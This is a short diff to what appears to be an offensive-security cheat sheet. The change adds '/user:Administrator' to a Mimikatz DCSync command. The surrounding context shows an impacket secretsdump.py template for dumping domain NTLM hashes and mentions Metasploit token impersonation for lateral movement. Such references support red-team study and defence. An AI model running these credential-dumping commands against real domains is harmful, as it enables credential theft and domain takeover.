@@ -1254,7 +1254,7 @@ SAM and SYSTEM files in:
             python3 /usr/share/doc/python3-impacket/examples/secretsdump.py [-just-dc-ntlm] <domainName>/<username>[:<password>]@<IP>
             ```
             
-        - Mimikatz: `lsadump::dcsync`
+        - Mimikatz: `lsadump::dcsync /user:Administrator`
 - [Metasploit incognito extension](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) + PowerShell *[New-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.1)* cmdlet
     
     ```bash
